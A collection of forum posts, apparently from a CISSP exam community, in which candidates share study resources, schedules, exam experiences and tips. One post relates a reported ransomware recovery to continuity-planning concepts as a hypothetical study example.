Overall i’d say the Exam Cram videos were the best to jog my memory on all the concepts leading up to the Exam. I don’t think I took the conventional study method as I took the Training Camp bootcamp and sat for the exam a few weeks later. I’ll be honest that my exam prep wasn’t the greatest as I only had limited nights and weekends to dedicate. But the week leading up I had 2 full day cram sessions (the day before and the day of the exam). 

Happy to answer any questions you have on the Exam or study materials.

517,ogfy0o,Passed the CISSP exam last week. Here's how I studied.,"I'll start with a big thank you to everyone that has posted what worked or didn't for them while studying. I gained a lot of insight browsing through numerous posts. I don't have any incredible insights, but below is what I used to pass the exam and hopefully someone can get some use out of it.

Almost all of the sources I used are available for free via O’Reilly/Safari Online if you have a DoD email.

 

Video Courses:

- Cybrary CISSP Video Course [Free]- Kelly Handerhan (15 hours) 
This course does a tremendous job of highlighting all of the major topics in each domain. Provides examples that make concepts relatable and easy to digest.


- CISSP Certification Video Boot Camp [Free w/O'Reilly account] – Thor Pederson (24.5 hours)
Provides a lot of practical examples. Examples are framed in a way that aligns to the “CISSP mindset.”


- CISSP Cert Prep [Free trial via LinkedIn Learning] – Mike Chapple (24 hours)
This was the only source updated for the new version of the exam released in May that I used. This series does a good job covering Domain 3 compared to the other sources.

- CISSP Complete Video Course, Second Edition [Free] – Sari Greene (26 hours)
This course is more formal and in-depth, heavily focuses on practical application of topics (some are not relevant to the exam).

- Mind Map [Free] – YouTube (6.5 hours)
Short and well-produced. They do a good job of summarizing topics within each domain and provide an organized view of the material. It’s a good source for a quick overview of each Domain or as a last minute review.



Text Materials:

- Eleventh Hour CISSP Study Guide [Free with O'Reilly]
Good for an overall introduction to CISSP topics. Some of the topics are dated, so keep that in mind if you use this for review.
 
- (ISC)2 CISSP Certified Information Systems Security Professional Official Study Guide 8th Edition [$40]

- “Sunflower” CISSP Summary Version 2.0 [Free]
Wasn't a fan of this, but I did use it as a final review.
 

Practice Exams:

-(ISC)2 CISSP Official Study Guide, 8e [Free if you buy the book]

- CISSP Official (ISC)2 Practice Tests [Free with O'Reilly account]


Misc:

- Why you WILL pass the CISSP – Kelly Handerhan via YouTube
Great job of covering the mindset you need to pass the exam.

- Essential CISSP Exam Guide: 2018 CBK [$14.99] – Audible (17 hours)
The audio quality is not the best, but I found this to be useful when I didn’t have time to sit down and study.

 

My Study Schedule:

I studied over a 3 month period. The first month was largely spent easing into an overview of each domain and trying to establish foundational knowledge to build upon later. During the first month I totaled 62 hours of study, a little over 2 hours per day. The second month was focused on diving deeper into the material, powering through multiple video courses, and taking a couple practice exams to determine where I stood. During the second month I increased my total study hours for the month to 82, averaging approx. 2 hours and 40 minutes per day. I spent the final month reading the official study guide and taking practice exams (I answered approx. 1,500 questions during this period). Overall, I spent 110 hours studying in this final month, averaging a little over 4 hours per day. I increased my study efforts during the final week before the exam, studying 36 hours during the final 7 days. All of this time was spent reviewing and not trying to learn new material.

 

Recap:

Month 1: 62 hours (2 hrs/day) - Intro to each domain
Month 2: 82 hours (2.5 hrs/day) - Deep dives
Month 3: 110 hours (4 hrs/day) - Practice Exams and reviews
 

Final Thoughts:

1. Develop a plan early and stick to it. Use some of the shorter study items to identify your strong and weak domains. Build your study plan around these results.

2. Don’t try to become an expert in your weak domains. Put in the time to become proficient, but don’t ignore the other domains.

3. Learn the logical processes as opposed to memorizing exact steps. Understand how everything fits together instead of memorizing definitions.

4. Remember to approach the test with the appropriate mindset.

5. Practice tests are important to identify knowledge gaps, but don’t try to memorize the answers. Read the explanations and try to understand why each answer is the correct choice.

6. Take a few breaks from studying where you don’t review any CISSP material for a day or two. Especially the day before the exam.

 

TLDR: There is a lot of free material available to those with a DoD email account. Set a goal and stick to it. Take some breaks and find time to relax and have some fun. Spend time reviewing questions on the exam and approach the test with the appropriate mindset. When you get close to your exam date, trust that you've done enough to prepare yourself and take a break the day before. Best of luck!",2021-07-08

My local community college doesn't offer any classes purely focused on the CISSP unfortunately. I already checked there.

525,ofgufw,Larry Greenblatt’s Boot Camp or Mike Chapple's Linkedin Course,"Good Morning

I am looking at doing some video training and I see both Larry Greenblatt's and Mike Chapple's courses are top in all the comments.  I was wondering which would be the best to go with.  From what I'm seeing they are both really good and I would do well with either.  I am leaning more toward's Larry's as I can download those as audio files and listen to them in the car, which is great for the 2-4 hours I spend in the car on Saturday/Sunday with time on my hands.

Thank you all for the responses.  I think I will use Larry's as I do like his style.  The video about the test posted below was insightful.

527,of0f0r,Passed today. Everything they say is true...,"I passed today with 100 questions in about 80 minutes. All of my questions were from left field. It's like the test writers said ""okay, you read the Sybex Guide? Good, so you know the terminology. But since you have 5+ years of security experience, you should know how to solve this hypothetical problem that's tangentially based on the this risk management principle..."" 

It's like it doesn't test you on your knowledge of the material, but rather on your ability to internalize a and articulate the principles in scenarios you've never contemplated. 

Or what's more -- it's like you're going to an oracle and telling her you're worthy of CISSP. You act like you're worthy, but the whole time, deep down, you question if you're really worthy (i.e. you expect to see FAIL at the end). In then end the oracle is never wrong. Now I just have to wait until my psychometric evaluation is complete to see if I can get past my provisional pass. Hopefully I'm worthy. 

Study materials (in no order):

1) Sybex book

2) Mike Chapple LinkedIn Learning (All Domains)

3) Thor Teaches (Domain 1 and 2)

4) Wiley Sybex App quizzes

5) Self-paced Online course from uCertify (paid for by my employer). This has quizzes and labs. 

It's hard to say which one was the best. But the uCertify course was long and I has to finish it all to get a test voucher, so it certainly had the biggest impact on me. 

Good luck to you all!",2021-07-06
528,of9geh,Fujifilm Ransomware BCP/DRP CISSP Correlation,"Greetings, I wish everyone good luck on their CISSP exam this week.  With all the ransomware news, I was especially impressed with the way Fujifilm handled their ransomware incident.  They didn't pay the ransom and recovered operations from backup.  Just thought I'd share some notes of what I thought Fujifilm's BCP/DRP process may have looked like if it helps to correlate the real-life event to your CISSP studies.  Everything below is hypothetical and just used as an example to apply CISSP concepts to real life.  These are just guesses.  

BCP/DRP Process (General) Steps

  **Step 1** **is defining a policy, narrowing down the scope, and beginning the initiation of the BCP/DRP**

*  For Fujifilm, their senior management probably did have a clear policy and scope defined.  
* We can tell they had a policy and scope because when the article I was reading on the publication “Verdict”, asked the company if they had sufficient backups, their response was “Fujifilm does have **backups** in place as a part of its **normal operations procedure** aligned with its **policy**”.
* If Fujifilm had a policy about normal operations procedures after a disaster, it means they definitely had a policy to have a BCP/DRP plan in the first place, because as we know, nothing gets done in a company without first having a policy from senior management.
* Because Fujifilm had a policy to have a BCP/DRP plan in the first place, it attributed to their successful recovery of operations. 
* Otherwise, if there was no policy or a BCP/DRP plan, things would not have gone as smoothly.
* During the ransomware attack nobody would know what to do, what direction to go, how to handle the situation…nothing.  It takes a policy from management to create the BCP/DRP plan, which will provide the pathway to how to handle a disaster.  

  **Step 2 Business Impact Analysis - Define the critical business functions and resources**

* Fujifilm's Chief of Operations could state that if the data on those servers were being held for ransom, the business would come to a standstill, and the data would be needed back in order to continue operations. 
* The Director of Network Operations could say that if their Content Delivery Network solution were to stop working, that would stop the organization’s e-commerce business process, and would result in a heavy loss of revenue.  
* Both provided a technical issue, but also stated how it would affect the overall revenue-generating process of the company (both technical and high-level reasons)

  **Step 3** **- Contingency Strategies (Decide the most cost-effective and reasonable recovery strategy)**

* According to FIPS 199 an impact level of ""High"" would mean any damage or disruption to assets with this rating could halt everything in the business, the organization, the objectives, the networks, systems, applications
* Suggested backup is real-time replication of data as well as WAN/VLAN replication
* Suggested recovery strategy is a hot site

  **Step 4 - Testing and Maintenance** 

* Out of all the tests, maybe they most likely did a parallel test
* Businesses are hesitant about a full-interruption test as it means to stop the business
* If it was a structured walkthrough then individuals who head their own respective departments come together and discuss responsibilities
* If they did a simulation test, they would have all their BCP coordinators, BCP team, network engineers or their bosses, or other operational and mid-level management there to participate.  
   * Meaning, it’s just a simulation, but you have to act like it's happening.  Fujifilm probably checked to make sure their backups were processing, and ran through some things to see if the backups could be retrieved, without actually fully recovering them.  
   * They just simulated not only the disaster, but also the response, nothing “actually” was done like in a parallel test.  
* And of course, as with all CISSP processes, make sure there is documentation  
* Also updating the BCP/DRP document in case of any of these changes: 
   * Major changes to the company’s network or system architecture 
   * Changes to senior management
   * The addition or removal of certain technology
* Documentation and updating changes to the BCP/DRP document is all part of ""maintenance""

I thought it was neat how Fujifilm didn't pay the ransom and initiated a successful BCP/DRP.

Have a solid week ahead.",2021-07-07

530,oexlqz,Cue the panic - 5 days until exam date,"Like many, I've just been lurking here, reading nearly every success and horror story. I'm five days out from exam time and the panic is starting to set in. I have five years experience in a non-technical role within InfoSec. No technical background whatsoever. 

I've been studying off and on for a little over a year, four consecutive months of intense study, and have been utilizing the usual suspects: Shon Harris AIO, 11th Hour, IC2 OSG, Destination Certification MindMaps, Boson, PocketPrep, handwritten notes, flashcards and all of Kelly's videos on Cybrary. I've also taken a 10-week  bootcamp class three times (seems excessive now that I'm writing that out!). The OSG was a last minute add but it's been helpful to switch things up a bit; I'd found I was getting too used to Boson's question formatting. 

I'm scoring 75-80% in Boson and the OSG test banks. Around the same in PocketPrep. I've answered thousands of practice questions and made thousands of flashcards. This week I'm trying not to panic-cram but instead focus on really honing in on the BCP, DRP, SDLC and incident response phases/processes. Also Kerberos because those terms are tricky AF. Domain 4 will always be my weakest domain since I had no idea what a packet was and had never heard of the OSI model before starting to study for the CISSP (true story). While I know the basics, I've resigned to the fact I'll never remember what every single protocol does. I'm hoping that my lack of technical background will help me think less like a problem-solver and more like a manager since that's really all I know. 

I've scheduled (and rescheduled) the exam 3 times but this time I'm going for it. My brain is cooked; even if I had another month before the exam, I don't know that I could retain anything additional. Anything you'd recommend for the last couple days before the exam (besides more panic)?",2021-07-06
531,oene2u,How to pass CISSP with limited budget,"Hi I provisionally passed at 100Q (30 minutes before time) on my 1st attempt. I prepared a long time since if I fail I couldn't retake it for at least a year because its too expensive (I saved money for this exam for almost two years and borrowed money from payday loans for some of the study materials) so failure wasnt an option.

My background:  
Im from a 3rd world country (Poland), Im working as a senior cybersecurity consultant for 6 years. Before that, I've been a Java/Scala developer for 8 years but I decided to go for cybersecurity since there are way too many software developers in my country and the wages were getting lower and lower due to high supply.  I was also always very interested in cybersecurity issues. Besides that, Im programming since I was about 13 and created several open source projects.

Materials used:  
\- All in One Exam Guide 8th edition - this was my primary resource for about 5 months since it was given to me (along with OSG and Think Like a Manager Book) by my colleague who also tried to take CISSP but he given up. I read the entire book very carefully but didnt take much notes. I scored about 80% in the tests. It was very boring and given too much details (history etc), I liked the OSG dry style much better;  
\- OSG 8th edition + practice tests - another resource given to me, I read chapters about domains 1, 3 and 5 since they were relatively unchanged compared to new 2021 exam (according to Mike Chapple comments) for about one month; this time I did many notes; in tests I scored about 85-90%;  
\- How To Think Like A Manager for the CISSP Exam - tiny book so I read it very quickly, pretty good resource;  
\- Mike Chapple videos on Linkedin - FREE for first month and updated for 2021 material so I watched them all during that first free month and did a lot of notes. Mike Chapple said that combining his videos with 8th edition OSG should be enough to prepare for 2021 exam;  
\- Official ISC2 flash cards - FREE, good to learn some definitions, minor mistakes;  
\- OSG 9th edition - one of two resources I bought, read chapters about domains 2, 4, 6, 7, 8 which changed most using speed reading (I got the book about 2 weeks before the exam). Vitalsource Bookshelf app is crap but I've had to use it since my account on amazon was blocked due to failed payments. Registered on Wiley  online learning and took all the tests, scored about 85-90 so same as for OSG 8th - questions vere much easier than those on the exam;  
\- CISSP Mindset Academy - scored 64% on both; few major errors but decent explanations for questions, questions vere more similar to those on the exam;  
\- [CISSPREP.net](https://CISSPREP.net) \- did only the free initial test and scored 80% (15 out of 19), couldnt use full version due to high cost (25$ - beyond my budget);  
\- Watched several youtube videos including Why you will pass the CISSP and How to Pass the 2018 CISSP exam: A Sure Fire Method to Help You Ace the Exam. Tried to watch also Destination Certification videos but I learned about this resource late in the study so I prefered my own already made mind maps to theirs;

Materials did not used:  
\- BOSON - I wanted to give it a try but it was way beyond my budget even with 25% discount and also not updated for 2021 so I decided to pass and use wiley as my primary test bank;  
\- Thor Teaches - ultra expensive also.

The exam:  
\- The questions were rather hard, some of them covered subjects I did not encounter before so I used elimination and reasoning technoques. I read questions and answers very slowly so at question 100 I was left with only 30min - if the test would keep going to question 150 I would be in a big trouble but thankfully it didnt.

540,oclvd0,CISSP official study guide + ADD == concentration nightmare. Anyone feel the same?,"So I’ve learned I study best and absorb material best if I’m actively participating in what I’m reading. Whether I’m listening to something and taking notes or reading and taking notes. The official study guide or any other books are something that I’ve never been able to read page by page because I can’t focus. 

Has anyone had any luck reviewing **just** the summary portions of each chapter and taking notes/researching what is not familiar and studying the book this way? This seems like the best way to absorb the meat of what’s necessary to understand for each chapter without reading every word page-by-page.

545,oc2t4m,Failed today (2 July) @ 150 Qs,"Dear Folks,


Good day!


Well not so good for me as I failed the exam after answering 150 questions in 1 hr and 45 mins.


I was thrown with a lot of questions in a certain topic in which I didn't dive that deep. When I checked the OSG, that topic is just discussed in one page and showed additonal links for further reading.


I tried to apply the ""Risk Advisor"" mindset during the exam. I would say I used it properly as I was able to determine which is the correct ""Managerial"" answer from the correct ""Technical"" answer which is focused on fixing things.


For my study plan, I've used OSG, Cybrary, Boson, CISSPrep, and Rob's MindMap for like over 6 months of studying.


I have 7 years of experience under my belt in IT (Telco, NW, Security Engineering) and currently working as InfoSec Consultant.


I am now thinking whether should I retake the exam. If so, I am considering to take it after 6 months or even couple of years. I think this exam is easier for folks who are more seasoned in the industry.


For those who are studying for the exam, don't stress yourself too much. Remember to take a break during your studies as this exam will surely bring a study fatigue.


Have a nice day!",2021-07-02

551,ob3mpw,Provisionally Passed 21 June 2021!!!,"150 questions in about 2 hours.  I made my first attempt about 4 years ago. On February 2021 I decided to give it another try. I booked the test to make sure I had a deadline. I studied a lot during my free time. I never felt prepared for this beast. I made sure that I truly understood the material and wasn’t just memorizing things. This helped me A LOT during the exam. I felt confident in maybe three of my answers. I read the question several times, read the answers, then read the question again. English is not my first language and I sometimes have a hard time figuring out what they are asking. I honestly thought I had failed. I didn’t look at the paper until I was outside the building. I almost cried when I read “Congratulations….” on the paper. I am honestly still in disbelief that I passed but I feel like a massive weight has been lifted. 

Study Materials:

I started with Kelly Handerhan’s CISSP Cybrary.it videos. They are amazing! She helped me focus my studies. 

Used OSG 8th edition as a reference book. I did read the end of chapter summaries. 

Rob Witcher’s Mindmap videos on YouTube were AMAZING!!!! 

I read the 11th Hour a week before my exam date to refresh my mind.

I did a lot of practice tests on the Wiley test engine that you can gain access with the OSG book. 

Thanks to this REDDIT community, I found CISSPREP.net. The questions were HARD but they helped me a lot. I have to agree that the way they ask the questions is probably the closest to the format of the exam. 

IT & Security App- I took quizzes whenever I was sitting around. 

I truly want to thank this community. I would find encouragement from everyone's posts, pass or fail. 

Experience:

I have about 14 years of experience in various roles as a SOC analyst, RMF roles, and engineering roles.

I don't think you can really be ready for the test

&#x200B;

I wanna thank all of you for all the tips in this sub, it's incredible how much info we have here!!

What worked for me:

* Mike Chapple LinkedIn videos
* Sybex practice tests and the Wiley efficient learning app - This is a great platform!
* Destination Certification CISSP Mind Map on Youtube - This guy does a wonderful job of summarizing and explaining key points in each domain. I think they compliment Chapple's videos really well. I would watch Chapple's videos, do some practice questions after the domain, and then watch the mind map video and then do some more practice questions. 
* Why you will pass the CISSP youtube video by Kelly Handerhan - this is a quick one and I watched it at the parking lot of the testing center, as a final pep talk before heading in.  

What didn't work:

* 11th Hour - so general I fell asleep
* [cisspprep.net](https://cisspprep.net) \- I picked it up on here and some of the reviews were great so I gave it a try... the website is somewhat confusing and while I got some good tips I felt like I was mostly looking to understand the author's intent in the question and what they wanted me to select than the actual info that's relevant for the exam

About me:

I have over 15 years of IT experience. I've been on the engineering side, the IT side, and now I work for a security vendor and talk security to CISO/CIO, architects, engineers and a LOT of the material for the exam was driving me nuts because it was just wrong. I knew what was expected of me to answer and so I did just that while grinding my teeth.

&#x200B;

Once again, thank you all for all the good tips!

557,oakjg4,Provisionally passed @ 107Q in ~130 minutes,"This was the 9th time I have sat for a certification exam in my IT career and I probably studied three times more than I did for any of the other ones - MCSE, A+, Security+. I have around 25 years of experience in the field, most of that as a network admin on Active Directory/Azure. But I've also worked the helpdesk, been Tier 2 and Tier 3 support, and even spent a year as a Logistics Manager, which I was surprised to find got me a lot of experience with the physical security concepts that were on the exam. 

I had actually planned to get my CISSP in 2020, back to back with getting my Security+, but two things happened right when I was about a month or so out from being ready for the exam, I got a new job, and then there was a global pandemic that shut all the testing centers down, so getting the CISSP went up on the shelf, but I did do about 4 hours of training a month on it, which is nowhere near enough but it kept me in the mindset.

Anyhow I got laid off this spring so I decided to go ahead and wrap up the CISSP certification while I have a lot of time to study for it. One thing that really got me into high gear was to go ahead and schedule the exam, once that clock is ticking down, even if it's weeks away, it will keep you motivated! I did find that it was hard to get available spots 1-2 months out for the exam, but if you keep checking the available spots you find that many candidates reschedule their exam when they're about 2-3 weeks out. So when I felt like I was about 3 weeks away from being able to do it I pulled the trigger on the 29th.

Study materials:

* **Original Study Guide (8th ed.) and Original Practice Tests** \- I got the bundle off of Amazon last year when I started studying the first time. I did wind up reading the OSG cover to cover in 5 days but it was towards the end of my studies. It's a tough read but I pushed my way through, and now I think that doing this was critical to understanding the material for the exam. It tied up a lot of small loose ends that I had been struggling on. I strongly suggest reading all of it at least once.  As for the OPTs I registered those online through Wiley Efficient Learning, and downloaded the ios app so I could take the tests on my PC and on my iPhone. I will say the web based version is kind of clunky and I wound up needing to login two or three times to get it to work but it was fine once I got logged in. The ios version seems to be better. The nice thing is that both the web version and the ios version share your results so you can check your progress from either platform.  One thing I didn't realize until late in the game was that if you register the OSG online as well it gives you a completely different test bank of 1300 questions, so be sure to register both products if you get the bundle!
* **Boson CISSP Practice Exam** \- I actually bought this last year as well but I had only taken the first of the five practice exams in it. Yes it's quite technical but just like the question banks from the OSG and OPT, it's testing you on the knowledge base you'll need to pass the real exam. No, the questions aren't like what you'll get on the exam but you must have a complete understanding of all 8 domains and that's what this product is testing you on. The explanations are excellent and will point out where you need to study more. Also at the end of the test it will show you what domains you may be weak on. 
* **My strategy for taking practice tests** \- I'd like to point this out because I think it's important - the CISSP exam is not like other technical certifications you may have done before. Taking practice exams over and over again until you've memorized all the questions and answers is not going to work. My study strategy for the practice tests evolved over time but the way I decided to do it was that instead of taking the same practice exams over and over again I would take them once, then go back and re-take all the questions I answered incorrectly. If I could answer one of the questions correctly then I was done with it and closed those questions out. Fortunately both Boson and Wiley Efficient Learning let you select only the questions you've answered incorrectly for creating custom quizzes so that's where I focused my studies. I did wind up taking the Boson tests twice, about three weeks apart, but out of the 10 practice tests on Wiley Efficient Learning I only took those once. 
* **MFProd on YouTube** \- I did these as part of my study last year before the pandemic hit. If I remember right it was more than 40 hours of material, and was very comprehensive. Unfortunately last year there was some kind of copyright issue with these and they were taken down. A shame, because I made my own ""boot camp"" out of it and took pages and pages of notes which I was referring to as recently as last night.
* **CISSP Cert Prep (2021) on Linkedin Learning** \- since MFProd was gone I needed to use something else, and I had used Mike Chapple's Security+ course on Linkedin to pass that exam so this was the first place I went. Fortunately I discovered that I could get access to LinkedIn Learning for free with my local library card! So I signed up for a library card and then got access to the LIL site. It's more or less the video version of the OSG so it's a bit dry and was kind of a grind but I watched all of it and got myself back up to speed.
* **Kelly Handerhan videos on Cybary** \- everyone talks about watching these and there's a good reason why - Kelly is uniquely skilled in explaining some of the harder to understand concepts you'll need to understand for the exam. After watching this I had Kerberos down solid. It's not like the LinkedIn Learning course in that it's much shorter and not as comprehensive so this is something you should watch towards the tail end of your studies, I was most of the way through this when I scheduled my exam time 3 weeks away.
* **CISSP MindMaps on YouTube** \- these are pretty good, when I was weak on a domain in the practice tests I would go back and watch the MindMap videos for the domain I needed to brush up on. 
* [**CISSPrep.net**](https://CISSPrep.net) **practice exams** \- this was the first of the HARD practice tests that I purchased. Some of the questions are a little rough around the edges but they're quite difficult and they have a LOT of practice tests. The exams are only 50 questions but they're hard, and it will take you a while to get through them. I only did about 5 of these in the end but the explanations are good and once I was done with Boson and WEL, these got me ready for what the real exam would be like.
* **CISSP Mindset Academy practice exams** \- these are also HARD questions and they've been updated for the new material on the 2021 exam. I took both exams just last week and was only able to score in the 50% range on them, that was a bit worrying to me until I found out that's a completely normal score for someone who is about ready for the exam. Once again, I would do these after you've already completed Boson and WEL- these get you ready for the real thing. These tests and the next one are both on Udemy. 
* **HARD CISSP practice questions #1 Thor Pedersen** \- for me this wound up being the final go/no-go for sitting the real exam. I decided that if I was under 50% the first time I took it I was not ready and would have to re-schedule the exam. I scored 55% when I took it last Sunday. I decided I was ready to go. Thor is the guy who says you should do 5000 practice questions before going for the exam, and I tend to agree with this. I'm not sure if I did 5000 questions but I'm pretty sure I was over 4000.
* **Eleventh Hour CISSP Study Guide** \- I got the audiobook version of this and listened to it all the way through on the very last day at 1.3x. Finished it right before I went to sleep on the last night before the exam.
* **Why You WILL Pass the CISSP Kelly Handerhan, Larry Greenblatt CISSP 2020 Exam Tips, The CISSP Mindset: How to ""Think like a Manager"" and PASS!**  \- watched these three videos right towards the end. Heck, the last one I watched in the parking lot of the testing center. These put you in the right manager/advisor mindset to take the real exam. Want to know why a lot of people fail the exam on the first try? They didn't have the manager/advisor mindset going into the exam, that's why.

So as others will tell you the questions you get on the practice exams aren't like what you'll see on the real exam and this is quite true, especially for the WEL and Boson stuff. The hard exams I listed are closer to the real thing though. 

Like everyone tells you, I wasn't sure if I had passed or not when the test ended. When I got to question 101 I knew it was really serious at that point, and by then time management was becoming an issue. Definitely read every question on the exam more than once! There were a couple of times when I looked at the answers and thought ""all of these are right answers"" and then I would find a single word in the question that made only of the answers the correct one. Those were the ""A-HA! GOT YOU!"" moments. (imagine the gif with Leonardo DiCaprio pointing at a tv screen here). There were also a couple of ""What the heck are they even trying to ask me?"" moments. I gasped when the test suddenly ended at question 107 and wasn't 100% certain how I had done until I opened the printout the lady at the front desk handed to me. I actually had to check that exam sheet a couple of times just to be absolutely certain I hadn't hallucinated the words ""Congratulations!"" and ""you have provisionally passed"".

By the way both this subreddit and the Certification Station discord server were critical in getting me that passing score. I was checking posts in here every single day and hanging out in the # cissp room on the discord server. 

Thanks everybody and if you have any questions I'll be happy to answer them.",2021-06-30
558,oa20k3,Passed CISSP first attempt (4 week study),"A little background - I’ve been in the industry for 20 years and have a degree in IT (Network Management and Infrastructure).  I work for a company doing cyber security software integration, testing, and support. Much of what I do is more in the CEH realm and I have a broad background that includes management so all of this certainly helped.  I also own a Technology consulting and support company providing cloud solutions, network architect/implementation services etc.

The company I work for won a contract that requires CISSP certified personnel and I was tasked with getting certified with about 30 days notice.  To their credit, they paid for a one week CED Solutions boot camp and gave me an additional week off (paid) to prepare before the exam.   I didn’t want to let them down so I studied like crazy. If I wasn’t on my computer taking ‘cccure’ practice tests, I was on my phone doing practice quizzes from ‘Pocket Prep.’  If I was driving, I was listening to ‘Mind Map’ and ‘Inside Cloud and Security’ YouTube videos.  

The test is no joke! I felt unprepared going in and throughout the test, I was never confident enough to put money on a passing score. I think this is normal and I knew I was answering more correctly than not. So relieved that I can continue my life and enjoy the summer! I would say the biggest help for me was going through practice exams and thoroughly reading explanations for every answer.  I already knew things like the OSI model, common port numbers, PKI etc. but I still reviewed every explanation as I went through practice questions.  My attitude going in was, I’m not gonna stress over a fail. I planned to study harder and attempt again in 30 days. It didn’t help that my family, coworkers and friends knew I was studying and all wished me luck… that just added pressure I didn’t need. Or maybe I did need the pressure. I’m just glad I passed.

561,oa0x4s,I passed CISSP on my second attempt. Lessons learned,"I finished the exam about four hours ago after a second attempt from a year ago and here’s what I learned. Tl;dr. “Have a plan, Attack!” > “Have a plan: Attack!”

My background: I’ve been working in security for about five years with a background in IT for about 20 years from desktop support to senior engineer/sysadmin roles. Up until today I had one recently expired ITILv3 Foundations and one expired Security+ certification. For each attempt I did about three months of studying.

1. What did I use to study?
The CISSP Official Study guide
The CISSP Official Practice tests (book)
The CISSP study test and exams mobile apps
11th Hour CISSP
Serious Cryptography (not on the exam but a good book for later to explain that stuff)
Cybrary (all respect to Kelly Handerhan but I only made it through the first two domains)
The Shon Harris book (all respect as well but I probably cracked it open twice during my first attempt and that’s it)
YouTube 
    CISSP Exam Cram Playlist (Inside Cloud Security)
    CISSP Mind Maps (Certification Destination)

2. How did I prep and why did I fail the first time?
I gave myself about three months of study time. I used the mobile app and took practice tests in small bursts (10-20 a day). Minimum of 70% on each of the domains
I planned it out three months in advance but didn’t have a plan other than taking the practice tests over and over. I made it a point to mark and highlight the official book (more like small post it notes but had not dived into the book as much. Two weeks before I skimmed through the 11th hr book writing down notes on paper, one domain per page. Admittedly I didn’t have a plan and wanted to get back to grinding towards OSCP. I also thought about the questions as an engineer and not a manager. I was also in a sour mood about it after reading a few job/certification threads on Twitter. Probably anecdotal but who knows. 

3. What I did this time?
So I mentioned OSCP earlier….I’ve put a lot of effort toward it but in between failing and peer pressure from work (something something jump off a cliff and get a CISSP because your coworkers did). Basically the Friday after failing my OSCP….again, I said @#$& it, I’ll just sign up for the exam and knock this out.

The first thing I did was plan out the next three months of how I was going to study.
The whole three months: listen to the aforementioned YouTube playlists over and over. Even in the background while playing video games or while I would go on walks. I not only wrote out a plan but also joined this subreddit and read a bunch of the passed/failed stories and used some of the least common denominators 

March-April: Finish ALL the practice test questions in the book, graded myself on each domain, and took notes for questions I was clueless on I.e. questions I couldn’t find a wrong answer to.
April-May: I used the mobile app (the official one) again, this time taking the tests in larger chunks (50 questions). Sometimes I would do all the domains, or sometimes a couple. No rhyme or reason, just more exposure and taking note of where I needed to study.
May-June: I wanted to get 100% finished with any of the domains on the app but did at least get a minimum of 70% on all the domains. I took notes from 11th hr again except this time I ignored stuff I was already familiar with. 

A week before and during the exam: In addition to all the other notes I wrote down a few notes for things I was still stuck on (formulas, key lengths, etc), but got some good advice from my boss for the exam on eliminating wrong answers: Use the laminated paper you get for the exam to write A,B,C,D and for each question, put an x next to each possible wrong answer. I also wrote down the formulas and other things I made a point to memorize on the exam. Did I run into a lot of those questions? I honestly couldn’t tell you, but I didn’t want it to be a concern. Aside from that I wrote at the top of the paper YOU ARE THE CEO! to set the framework.

As for the exam, I was feeling confident up until about the last thirty questions and was getting that sinking feeling I wasn’t gonna pass but had already made my mind up and planned out what I was gonna do after so to be honest even after passing I walked out the building saying “@##& this exam” to myself. It has to be the first time I was pissed about something positive I did. 

Anyway, aside from planning things out I wanted to give a shout-out to this subreddit for the stories shared. One thing that can be a double edged sword is seeing all the celebratory posts on passing it. 

Work wise it was also much easier to plan and focus when I would see really smart people exercise the knowledge and not treat it like a “checkbox” cert. I loathe the idea of learning out of arbitrary “obligation”.",2021-06-29
562,o9wzlc,I PASSED CISSP on 2nd TIME!!!,"So, I stumbled upon this group late in my CISSP studies, probably a couple of days ago to be honest.  I had already scheduled the test and only had a few days from discovering this subreddit before I took it.  Even with that short amount of time, some of the resources on this subreddit were extremely helpful!

I took the CISSP exam this morning at 0800, and after around 110 min and 150 questions...I GOT THE GREAT NEWS THAT I PASSED!  I just really wanted to share this with everyone as I am so ecstatic over this accomplishment!

In case anyone wants to know, below are the study materials that I used.

* I attended a boot camp through Infosec Institute.  Was extremely helpful and they also have a pass guarantee where if you do well in the class but do not do well on the test, you can retake the bootcamp and test without extra charges. 10/10
* Boson Ex-Sim Max - EXTREMELY helpful with explaining why things were the way that they were.  Unfortunately, I remember questions well, so after taking multiple tests through the Boson software I was recognizing questions, but still, would recommend 8/10.
* Wiley Test Bank - Basically the same as Boson, not as informative as to why answers were the right answers, but has a huge test bank and I did not see many questions multiple times. 7/10
* Eleventh Hour - I really enjoyed the summarization that this book used to explain different concepts throughout the Sybex text.  I read it twice through leading up to the test. 8/10
* CISSP Sunflower Summary - A couple days before the test, I read this all the way through while also taking practice tests for each domain as I read through them.  A very good summary of information, but don't use as your ONLY study guide. 6/10
* The CISSP Mindmap Videos by Rob Witcher - Extremely helpful and nice to listen to while I was driving in the car.  A lot of information crammed into short videos, but still helped me solidify some information. 7/10
* Kelly Handerhan Why you will pass the CISSP - CAN'T STRESS THIS ENOUGH, this video was extremely helpful on understand what mindset to have when you are going to take the test.  I listened to this at LEAST 4 times leading up to the test.  Don't think I would have passed without it. 10/10

I am sure there were some more sources that I used, but these were the primary sources.  My biggest advice, don't just take practice tests and questions over and over.  They are helpful, but way more helpful when you understand WHY the answers are the actual answers.

Good Luck to everyone!",2021-06-29
563,oa36sd,Provisionally passed 29th June 2021,"I had provisionally passed the CISSP exam this morning. It ended at 100 questions around 135 mins mark. 

I scheduled the exam date in April just before the price hike, and I almost exclusively only used Luke Ahmed's Study Notes and Theory practice tests to prepare during the past 2 months.

I had practiced with questions A until 1A one time each, and only used 1 set of practice exam from Boson to check if I was able to complete 150 questions within 3 hours. Overall I think I had reviewed around 1000 questions.

My average score varies between 60+ to 70+, but after taking Luke's hard questions, the real exam questions feel simpler, but not easy by any means.

Though I didn't read any prep books besides reviewing the practice tests, I do have 10+ years of experience in the field which I relied upon heavily. Using similar strategy, I had passed CISM exam in March this year after 2 weeks practising the QAE.

On the last day before the exam, I had also watched some of the Destination Certification CISSP videos on Youtube and I found them to be very helpful in solidifying the concepts. I wish I had watched all of them earlier!

I didn't follow any strict study plans, just practiced the questions whenever I can; on the bus, after work while listening to the news, while tending to the baby crying, while accompanying my wife watching Netflix, and even during toilet time lol! I'm fortunate that my wife is very understanding to tolerate my 3AM sleep schedules.

I had seriously considered to reschedule the exam date to have more time to prepare, but I'm really glad that I believe in myself and go ahead anyways. Extremely relieved that it's over now!

Find whatever works for you, and go ahead with it!",2021-06-29
564,o9xi77,Passed today @100q,"So, I passed the exam today after finishing 100 questions. I will admit I was shocked but of course overjoyed.

I want to thank everyone here for sharing their experiences and insights as it relates to preparation and more.

